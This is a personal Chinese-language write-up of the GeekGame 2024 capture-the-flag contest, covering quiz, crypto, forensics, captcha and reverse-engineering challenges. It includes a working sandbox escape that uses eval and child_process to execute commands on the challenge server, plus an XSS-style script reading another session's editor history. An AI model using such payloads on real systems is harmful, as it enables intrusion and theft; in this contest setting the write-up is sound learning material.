# GeekGame 2024 c小t之Writeup
## 签到
包手点的

## 清北问答
[石刻文字](https://k.sina.cn/article_6839256553_197a6c5e900100s1wc.html?from=edu)

小喵[搜索](https://developers.weixin.qq.com/community/develop/article/doc/000ac0bd4ec69060d1caf768f56013)后得知小程序名字，打开小程序用 Stream 抓包：

![](img/IMG_7461.PNG)

得到域名。

[AltGr](https://wikimili.com/en/AltGr_key) 在下面 Germany keyboards 数了 12 个。

antv/g2 版本号，[在比赛平台前端 Github 里直接搜索](https://github.com/search?q=repo%3APKU-GeekGame%2Fgs-frontend%20antv%2Fg2&type=code)， 版本号在下面 package-lock.json 中 npm 镜像源地址末尾里。

最后一题直接下了个 Ubuntu Desktop 22.04 镜像扔虚拟机里运行，一开始用 amixer 得到的结果并不正确，于是换了 pacmd:
```Bash
pacmd
set-sink-volume 0 0xC000
list-sinks
set-sink-volume 0 0x4000
list-sinks
```

![](img/75.png)

![](img/25.png)

再进行一个减法运算并四舍五入就是答案了。

神秘的塔，搜索船上广告牌内容得到：

![](img/search.png)

全国很多地方都有叫七星公馆的地方，这样完整搜出来的结果都是指向北京月亮河的。

然后在地图上找到龙船，结合街景看过去。

![](img/map1.png)

![](img/IMG_7464.PNG)

提交记录：

![](img/小北1.png)
![](img/小北2.png)

## 大模型模型虎视眈眈
稍稍改一点内容都会让结果有很大变化，这是调了很多次才出来的：

![](img/QQ截图20241012124556.png)
![](img/QQ截图20241012131807.png)

有点狼狈，不过也无所谓了。。。

## 新穷铁道
png 拖入 WinHEX，把文件末尾的数据拿出来，是一封邮件。

base64 解码得到 HTML 内容，quoted-printable 得到猪圈提示，二者 mixed 解码得到内容:

`jkcx{uXlvCNwRnaXOWZPkhDNFRdanGIAsvzkc}0`

第二阶段才解出，除了奇偶数车次都想到了。。。

得到提示之后，尝试奇数的猪圈不带点偶数带点，就出来了：
`vigenerekey||ezcrypto`
找到个[在线网站](https://ctf.bugku.com/tool/vigenere)解密得到 flag。

真的感觉像是做 Puzzle Hunt...

## 熙熙攘攘我们的天才吧
### Magic Keyboard
```Javascript
const fs = require('fs');
const keycode = require('keycode');

fs.readFile('./sunshine.log', 'utf8', (err, data) => {
	if (err)
	{
		console.error(err);
		return;
	}
	var reg = /(?<=keyAction \[00000003\]\r?\nkeyCode \[..).{2}(?=\])/g;
	var result = '';
	while (1)
	{
		var r1 = reg.exec(data);
		if(r1) result += keycode( parseInt('0x'+r1[0]));
		else break;
	}
	console.log(result);
});
```
就嗯匹配。输出内容：

![](img/onlyapplecando.png)

那就是 `onlyapplecando` 了。

### Vision Pro
Wireshark 启用 RTP 后能识别到 RTP 包。在上面菜单栏 电话>>RTP>>RTP流>>Play Streams，输出 payload，然后就可以直接播放了。

![](img/QQ截图20241012212205.png "一眼盯帧")

莫名其妙拿了个一血，好神奇！～～

![](img/ishisashimaster.png)

![](img/wow.png)

本来是校外一血的，后来那个一血非两校外选手被封禁了，我就成了全局一血 233333

### AirPods Max
本来还在 Wireshark 里死磕，过了一会官方放出了提示，包含一个转换 RTP payload 至原始 Opus 报文的 py 程序。

结合 py 中链接指向的 Sunshine 源码，知道要找 avRikeyID 和 AES 密文，结果我一直试图在 pcap 里找，还想着重放网络包来复现（当然没有成功）。

最后在第二阶段，比赛结束前一天中午，我打算开始写 Writeup。翻了翻解题过程的记录，发现我要的东西都在解 flag1 用到的 `sunshine.log` 里，这下功亏一篑了：

> 注意：请关注程序运行的每一步，不经意的遗漏都可能导致你功亏一篑。

> 请你一定要始终牢记最初的发现，不要在解题过程中迷失了自我。

我是直接在提示给的程序上改的：

```python
import struct
import json
import re
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_audio_pkt(p):
    typ = int(p['_source']['layers']['rtp']['rtp.p_type'])
    seq = int(p['_source']['layers']['rtp']['rtp.seq'])
    if typ==127: return # fec
    assert typ==97

    b = bytes.fromhex(p['_source']['layers']['rtp']['rtp.payload'].replace(':', ''))
    iv = struct.pack('>i', int('1485042510')+seq) + b'\x00'*12
    cipher = AES.new(b'\xF3\xCB\x8C\xFA\x67\x6D\x56\x3B\xBE\xBF\xC8\x0D\x39\x43\xF1\x0A', AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(b), 16)

with open('C:\\Users\\Ctone Cheng\\Desktop\\workdesk\\audio.json', 'r') as ap:
    i = 0
    result = b''
    data = json.load(ap)
    lenn = len(data)-1
    str = ''
    while i < lenn:
        #print(decrypt_audio_pkt(data[i]))
        decrypted = decrypt_audio_pkt(data[i])
        if decrypted:
            str += base64.b64encode(decrypted).decode("utf-8")+'\n'
            #payload = re.sub(r"(.{2})(?!=$)", r"\g<1>:", decrypted.hex()).rstrip(":")
            #data[i]['_source']['layers']['rtp']['rtp.payload'] = payload;
        i += 1
    with open('audiob64.txt', 'w') as ap2:
        ap2.write(str)
    #with open('audioedited.json', 'w') as ap2:
    #    json.dump(data, ap2)
```

为什么要转成一行一个 base64 包？因为我找到了个 [opus-packet-decoder](https://github.com/zkry/opus-packet-decoder) 支持转换 base64 的 opus 数据包至 PCM 数据。`opus-packet-decoder -f audiob64.txt` 后把 PCM 丢到 Audacity 里，就可以听到正常的音频。
我没细看源码，直接默认它们是 opus 裸流的。

到这一步已经很开心了。听了下音频首先想到的就是前不久给家里摄像头重新配网时手机发出的声波，去b站上听了下感觉不对。又去搜了关于 CTF 音频隐写 的文章。又把 PCM 以 8kHz 导入并播放，像是拨号的声音，于是输入到 dtmf2num 得到神秘数字，套括号直接提交，开心地乱叫了起来～～

![](img/QQ截图20241018134902.png)

在下午上课前满意地交上了自己的最后一个 flag。~~那节课是 Python与人工智能基础~~

## 验证码
### Hard
直接先 F12 再进入题目，验证码直接就贴在下面了。复制，然后粘贴...怎么粘贴不了？

没关系。AutoHotKey，启动！感叹号需要进行转义。

### Expert
直接先 F12 再进入题目，

![](img/hacker.png)

啊以前没有应对过这种情况。。上网搜搜，找了个浏览器插件 SingleFile 来保存当前页面内容，但好像没看到有存 js..没事，本地打开 HTML 后就可以 F12 了。F12 之后发现无法选取元素，也不能操作 DOM，删掉 `template` 那里的东西就好了。

分析一下然后控制台里运行：
```Javascript
var allchunk = document.querySelectorAll('.chunk');
var ans = '';
for(var i = 0; i < allchunk.length; i++)
{
	var regreplace = function()
	{
		var reg = /data-.{8}/g;
		while (1)
		{
			var r1 = reg.exec(orgstr);
			if(r1) ans += allchunk[i].getAttribute(r1[0]);
			else break;
		}
	};
	var orgstr = window.getComputedStyle(allchunk[i],'::before').getPropertyValue('content');
	regreplace();
	var orgstr = window.getComputedStyle(allchunk[i],'::after').getPropertyValue('content');
	regreplace();
}
console.log(ans);
```

看着好傻啊，2333(

没事反正能出答案就没管那么多了

然后还是 AHK 输入。顺带一提这个验证码页面特别吃资源。

![](img/QQ截图20241012151533.png)

到比赛结束前发现这个 ahk 还没关掉。

## 概率题目概率过
### 前端开发
同样是在第二阶段之前给了小提示。看了 WebPPL 文档知道要加 `_top` 来使用部分原生 JS 的函数，并成功改了文档标题。

在框里随便 `console.log` 几下再按照提示检查 Heap snapshot 果然发现了之前输入和输出的字符串。输出的字符串是存在控制台里的，于是清掉控制台再看，就只剩 console.log(xxx) 的内容了。

也是第一次用这个功能。很多函数的 context 好像没办法通过 js 获取（那些灰色的对象还是什么），后来找到了这个，感觉有希望：

![](img/p111.png)

在控制台里摸过去，果然出来了。然后blablabla写了很多很笨的东西尝试获取所有这个对象里的内容，都不太行，最后还是直接注释掉 `xssbot.py` 里的 `headless` 本地模拟，发现在 [15] 里，就直接在比赛网页终端获取这个索引，直接就出来了。~~早该这么干的~~

![](img/p222.png)

```Javascript
_top.eval('var ffff = ""; obj = document.querySelector(".CodeMirror")["CodeMirror"]["doc"]["history"]["done"];');
_top.eval('ffff += JSON.stringify(obj[15]["changes"][0]["text"]);');
_top.eval('document.title = "wtf"+ffff;');
```

![](img/概率吗.png)

### 后端开发
第一阶段在网上搜过之后尝试 `require` 以导入 `child_process`，没有成功，就先搁置了。

第二阶段提示告诉我可以用 `import()`，于是：
```Javascript
_top.eval("
	import('child_process').then((module) => {
	module.exec('/read_flag_2', function(error, stdout, stderr){
		if(error)
		{
			console.error('error: ' + error+stdout);
			return;
		}
		console.log('stdout: ' + stdout);
		console.log('stderr: ' + stderr);});
	}).catch((error) => {console.log(error);});
")
//实际运行时是直接合到一行输进去的，这里换行是为了看着舒服点
```

![](img/概率flag2.png)

## Fast Or Clever
下载之后往 IDA 一扔，F5，看不懂，叉掉（

后来看到好多人都做出来了，想着也许是送分题，又拿出来看了一下，这次大概知道它如何工作以及我要做什么。

看到个 260L，于是：

![](img/fastorclever.png)

好像不这样也能出？

## 从零开始学Python
第一阶段时没看

第二阶段：搜索，然后下了 pyinstxtractor.py 进行解包。出来的 pymaster.pyc 用 uncompyle6 反编译，看到一大坨 base64
拿去解码，看到乱码里还包着一坨 base64，再解码就是乱码了。于是以 Hex 解码，把文件头 `78 9C` 拿去搜，得知是 zlib 压缩。

安装 zlib 模块，使用 `zlib.decompress()` 得到 flag1：

![](img/pyext.png)

## 完美的代码
本地就试了四五次的样子便得到 flag1，撞大运了（

![](img/wocao!.png)
no i dont know(

# Extra
比起上一届花了更多的时间，总算挤进前 100 了。（不过这届排行榜会显示前 200）

ChatGPT 在比赛整个过程中对我几乎没有半点帮助，但我卡题的时候还是会去找它。

因为舍友晚上都要休息，就没有熬夜解题。
不过也没睡几个好觉。记得周六比赛开始，周日早上梦里全都是 CTF，怎么也睡不好，被无形的力量催着起床打比赛的感觉。。

唯一的遗憾是 memos，好像在这上面花了最多时间。
但是死脑筋，总觉得和 JWT 有关，最后也找不到突破口。。

神秘计算器的 flag1 也是拿不到，唉数学

别的好像都没怎么看。睡觉去了！
